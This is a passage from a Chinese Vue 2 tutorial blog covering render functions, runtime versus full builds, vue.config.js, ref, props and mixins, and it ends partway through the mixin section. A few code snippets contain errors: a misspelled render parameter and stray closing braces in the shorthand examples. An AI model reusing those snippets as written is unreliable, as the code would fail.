<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&lt;%= htmlWebpackPlugin.options.title %&gt;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">strong</span>&gt;</span>We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- built files will be auto injected --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="3-4-render函数"><a href="#3-4-render函数" class="headerlink" title="3.4.render函数"></a>3.4.<code>render</code>函数</h2><p>我们把<code>render</code>函数那部分注释掉，会提示我们用的<code>vue</code>是运行版本，这个版本是没有模板解析器的，所以要用<code>render</code>函数来解析模板。而之前本地引用的<code>vue.js</code>是有模板解析器的</p>
<p>我们在入口文件引入的<code>vue</code>是残缺的：<code>import Vue from &#39;vue&#39;</code></p>
<ul>
<li>将模板交给<code>render</code></li>
<li>引入完整版本的<code>vue</code></li>
</ul>
<p>我们在引入第三方库的时候，只写了名字，现在要找到具体位置，确认引入的究竟是哪一个<code>js</code>文件</p>
<p><code>import Vue from &#39;vue&#39;</code>实际上只引入<code>node_modules/vue/</code>这个文件夹：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220526162049999.png" alt="image-20220526162049999"></p>
<p>我们看一下<code>package.json</code>：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist/vue.runtime.common.js&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist/vue.runtime.esm.js&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>其中的<code>module</code>字段表示，如果通过<code>es6</code>模块化的语法引入，则实际引入的文件是<code>dist/vue.runtime.esm.js</code>，可以在该文件中新增打印语句确认一下：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220526162240712.png" alt="image-20220526162240712"></p>
<p>这个<code>vue</code>就是残缺版的<code>vue</code>，少了模板解析器，则<code>template</code>配置项就没人解析了</p>
<p>我们可以试试第二种方式，引入<code>import Vue from &#39;vue/dist/vue&#39;</code>，模板正常解析，页面出来了</p>
<p>但是，为什么要引入残缺版的<code>vue</code>呢？</p>
<p>我们先改写一下<code>render</code>配置项：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="title function_">render</span>(<span class="params">creatElement</span>) &#123; <span class="comment">// 要有返回值</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;render&#x27;</span>, <span class="keyword">typeof</span> creatElement) <span class="comment">// function</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">createElement</span>(<span class="string">&#x27;h1&#x27;</span>, <span class="string">&#x27;你好啊&#x27;</span>) <span class="comment">// 手写源码后就没啥问题了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>简写：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="string">&#x27;h1&#x27;</span>, <span class="string">&#x27;你好啊&#x27;</span>) <span class="comment">// h是参数createElement</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>组件写法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>回到刚刚的问题，为啥要引入没有模板解析器的残缺版的<code>vue</code>呢？</p>
<p>因为模板解析器的代码体积，占据了整个<code>vue</code>的<code>2/3</code>的体积</p>
<p>并且打包后的文件会包含模板解析器，此时是不需要的</p>
<p>还有个细节的问题：</p>
<ul>
<li><code>render</code>函数解析的是<code>template</code>配置项里的模板</li>
<li><code>.vue</code>文件里的<code>template</code>并不是<code>render</code>函数解析的<ul>
<li>用的<code>vue-template-compiler</code>这个<code>loader</code>解析的</li>
</ul>
</li>
<li>如果就像在浏览器上，运行残缺版的<code>vue</code>，可以引入<code>vue.runtime.js</code></li>
</ul>
<p>小结：</p>
<p>关于不同版本的<code>vue</code></p>
<ul>
<li><code>vue.js</code>与<code>vue.runtime.xxx.js</code>的区别<ul>
<li><code>vue.js</code>是完整版的<code>Vue</code>，包含核心功能和模板解析器</li>
<li><code>vue.runtime.xxx.js</code>是运行版的<code>Vue</code>，只包含：核心功能，没有模板解析器</li>
</ul>
</li>
<li>因为<code>vue.runtime.xxx.js</code>没有模板解析器，所以不能使用<code>template</code>配置项，需要使用<code>render</code>函数，接收到<code>createElement</code>函数去指定具体内容</li>
</ul>
<h2 id="3-5-修改默认配置"><a href="#3-5-修改默认配置" class="headerlink" title="3.5.修改默认配置"></a>3.5.修改默认配置</h2><p><code>Vue</code>脚手架隐藏了所有<code>webpack</code>相关的配置，若想查看具体的<code>webpack</code>配置，可以执行：<code>vue inspect &gt; output.js</code></p>
<p>如果要修改默认配置，需要借助<code>vue.config.js</code>配置文件</p>
<p><a target="_blank" rel="noopener" href="https://cli.vuejs.org/zh/config/">配置参考 | Vue CLI (vuejs.org)</a></p>
<p><code>vue.config.js</code> 是一个可选的配置文件，如果项目的 (和 <code>package.json</code> 同级的) 根目录中存在这个文件，那么它会被 <code>@vue/cli-service</code> 自动加载。你也可以使用 <code>package.json</code> 中的 <code>vue</code> 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写。</p>
<p>这个文件应该导出一个包含了选项的对象：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@type</span> &#123;<span class="type">import(&#x27;@vue/cli-service&#x27;).ProjectOptions</span>&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// 选项...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者，你也可以使用 <code>@vue/cli-service</code> 提供的 <code>defineConfig</code> 帮手函数，以获得更好的类型提示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="keyword">const</span> &#123; defineConfig &#125; = <span class="built_in">require</span>(<span class="string">&#x27;@vue/cli-service&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="comment">// 选项</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>有一定<code>webpack</code>基础再看官网的这些配置项说明，是没啥问题的</p>
<ul>
<li><p>修改入口文件：<code>pages</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">pages</span>: &#123;</span><br><span class="line">    <span class="attr">index</span>: &#123;</span><br><span class="line">      <span class="comment">// page 的入口</span></span><br><span class="line">      <span class="attr">entry</span>: <span class="string">&#x27;src/index/main.js&#x27;</span>,</span><br><span class="line">      <span class="comment">// 模板来源</span></span><br><span class="line">      <span class="attr">template</span>: <span class="string">&#x27;public/index.html&#x27;</span>,</span><br><span class="line">      <span class="comment">// 在 dist/index.html 的输出</span></span><br><span class="line">      <span class="attr">filename</span>: <span class="string">&#x27;index.html&#x27;</span>,</span><br><span class="line">      <span class="comment">// 当使用 title 选项时，</span></span><br><span class="line">      <span class="comment">// template 中的 title 标签需要是 &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt;</span></span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;Index Page&#x27;</span>,</span><br><span class="line">      <span class="comment">// 在这个页面中包含的块，默认情况下会包含</span></span><br><span class="line">      <span class="comment">// 提取出来的通用 chunk 和 vendor chunk。</span></span><br><span class="line">      <span class="attr">chunks</span>: [<span class="string">&#x27;chunk-vendors&#x27;</span>, <span class="string">&#x27;chunk-common&#x27;</span>, <span class="string">&#x27;index&#x27;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 当使用只有入口的字符串格式时，</span></span><br><span class="line">    <span class="comment">// 模板会被推导为 `public/subpage.html`</span></span><br><span class="line">    <span class="comment">// 并且如果找不到的话，就回退到 `public/index.html`。</span></span><br><span class="line">    <span class="comment">// 输出文件名会被推导为 `subpage.html`。</span></span><br><span class="line">    <span class="attr">subpage</span>: <span class="string">&#x27;src/subpage/main.js&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>关闭语法检查：<code>lintOnSave</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vue.config.js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">lintOnSave</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="3-6-ref属性"><a href="#3-6-ref属性" class="headerlink" title="3.6.ref属性"></a>3.6.<code>ref</code>属性</h2><p>在<code>vue</code>中如果想要获取<code>dom</code>，使用<code>ref</code>属性</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ref</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">    Hello</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>组件实例上，有一个<code>$refs</code>属性，收集了含有<code>ref</code>属性的结构</p>
<p>使用：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">title</span>)</span><br></pre></td></tr></table></figure>

<p>如果给组件标签添加了<code>ref</code>属性，取到的则是组件的实例对象，可以用作组件间的通信</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">School</span> <span class="attr">ref</span>=<span class="string">&quot;school&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">School</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>而如果是给的<code>id</code>，取到的则是渲染后的<code>dom</code>结构</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">School</span> <span class="attr">id</span>=<span class="string">&quot;school&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">School</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>小结：<code>ref</code>属性</p>
<ul>
<li>被用来给元素或子组件注册引用信息（替代<code>id</code>）</li>
<li>应用在<code>html</code>标签上，获取的是真实<code>dom</code>，应用在组件标签上获取的是组件实例对象（<code>vc</code>）</li>
<li>使用方式<ul>
<li>打标识：<code>&lt;h1 ref=&quot;xxx&quot;&gt;...&lt;/h1&gt;</code>或<code>&lt;School ref=&quot;xxx&quot;&gt;&lt;/School&gt;</code></li>
<li>获取：<code>this.$refs.xxx</code></li>
</ul>
</li>
</ul>
<h2 id="3-7-props配置"><a href="#3-7-props配置" class="headerlink" title="3.7.props配置"></a>3.7.<code>props</code>配置</h2><p><code>props</code>：给子组件传递数据</p>
<p>写法：</p>
<ul>
<li><p>使用组件标签的同时，自定义属性：<code>&lt;School name=&quot;sai&quot;&gt;&lt;/School&gt;</code></p>
<ul>
<li>相当于往组件上传值</li>
</ul>
</li>
<li><p>组件内容要有一个配置项，接收传过来的值（数组写法）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">props</span>: [</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>子组件中定义<code>data</code>，并接收<code>props</code>传值：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">props</span>: [</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span></span><br><span class="line">],</span><br><span class="line"><span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终组件实例对象上，<code>name</code>和<code>age</code>属性是都有的，说明通过<code>props</code>的确拿到了传入的值并挂载在了组件实例对象上</p>
<p>但组件实例的<code>_data</code>上只有<code>age</code>属性</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220526191130632.png" alt="image-20220526191130632"></p>
</li>
<li><p>传值的类型</p>
<ul>
<li>传字符串：<code>&lt;School name=&quot;sai&quot;&gt;&lt;/School&gt;</code></li>
<li>传表达式的结果：<code>&lt;School :age=&quot;18+1&quot;&gt;&lt;/School&gt;</code><ul>
<li>最终传的值是<code>19</code></li>
</ul>
</li>
</ul>
</li>
<li><p><code>props</code>使用对象写法，对类型进行限制</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">props</span>: &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="title class_">String</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="title class_">Number</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>props</code>限制必须传值、设置默认值，一般这两个配置项不会同时出现</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">props</span>: &#123;</span><br><span class="line">  <span class="attr">name</span>: &#123;</span><br><span class="line">  	<span class="attr">type</span>: <span class="title class_">String</span>,</span><br><span class="line">      <span class="attr">required</span>: <span class="literal">true</span>, <span class="comment">// 限制为必须传值</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">age</span>: &#123;</span><br><span class="line">  	<span class="attr">type</span>: <span class="title class_">Number</span>,</span><br><span class="line">      <span class="attr">default</span>: <span class="number">18</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意点</p>
<ul>
<li><p>不要传递类似<code>key</code>等关键字</p>
</li>
<li><p>使用<code>props</code>声明时，不要多声明，传啥就声明啥</p>
</li>
<li><p><code>props</code>从外部接收到的值，是不允许修改的，如果直接修改会报错</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220526192908549.png" alt="image-20220526192908549"></p>
<ul>
<li><p>最终<code>props</code>和<code>data</code>中的配置项，都会被挂载在组件实例对象上</p>
</li>
<li><p><code>props</code>的优先级比<code>data</code>高，可以在<code>data</code>中定义新的变量，值为<code>props</code>的先接收到变量</p>
</li>
<li><p>模板使用<code>data</code>中的数据，如果需要修改数据，修改<code>data</code>配置项的数据，是没有问题的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h2&gt;&#123;&#123;name&#125;&#125; - &#123;&#123;myAge&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;button @click=&quot;modifyAge&quot;&gt;click&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;School&#x27;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      myAge: this.age</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  props: &#123;</span><br><span class="line">    name: String,</span><br><span class="line">    age: Number</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    console.log(this)</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    modifyAge() &#123;</span><br><span class="line">      this.myAge++ //修改data的配置项</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>小结：</p>
<ul>
<li><p>功能：让组件接收外部传递进来的数据</p>
<ul>
<li><p>传递数据：<code>&lt;Demo name=&quot;xxx&quot;/&gt;</code></p>
</li>
<li><p>接收数据：</p>
<ul>
<li><p>第一种方式（只接收）：<code>props: [&#39;name&#39;]</code></p>
</li>
<li><p>第二种方式（限制类型）：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="title class_">Number</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>第三种方式（限制类型、限制必要性、指定默认值）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="title class_">String</span>, <span class="comment">// 类型</span></span><br><span class="line">        <span class="attr">required</span>: <span class="literal">true</span>, <span class="comment">// 必要性</span></span><br><span class="line">        <span class="attr">default</span>: <span class="string">&#x27;sai&#x27;</span> <span class="comment">// 默认值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>备注：<code>props</code>  是只读的，<code>Vue</code>底层会监视你对<code>props</code>的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制<code>props</code>的内容到<code>data</code>中一份，然后去修改<code>data</code>中的数据</p>
</li>
<li><p>父传子，可以传<code>data</code>和<code>method</code></p>
<ul>
<li><code>data</code></li>
<li><code>method</code>，子组件调用传过来方法时，如果传入了参数，父组件也是可以收到的</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-8-mixin配置"><a href="#3-8-mixin配置" class="headerlink" title="3.8.mixin配置"></a>3.8.<code>mixin</code>配置</h2><h3 id="3-8-1-mixin基本使用"><a href="#3-8-1-mixin基本使用" class="headerlink" title="3.8.1.mixin基本使用"></a>3.8.1.<code>mixin</code>基本使用</h3><p>两个组件共享一个配置时，可以放在<code>mixin.js</code>中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> mixin1 = &#123;</span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">        <span class="title function_">showName</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以配置多个混合</span></span><br></pre></td></tr></table></figure>

<p>借助<code>mixins</code>配置项，可以在多个组件中使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h2&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">        &lt;button @click=&quot;showName&quot;&gt;click&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import &#123;mixin1&#125; from &#x27;../mixin/mixin&#x27;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;MySchool&#x27;,</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                name: &#x27;sai&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        mixins: [ //使用混合</span><br><span class="line">            mixin1</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-8-2-定义多个混合"><a href="#3-8-2-定义多个混合" class="headerlink" title="3.8.2.定义多个混合"></a>3.8.2.定义多个混合</h3><p>定义多个混合</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> mixin1 = &#123;</span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">        <span class="title function_">showName</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> mixin2 = &#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">x</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">y</span>: <span class="number">2</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用多个混合</p>
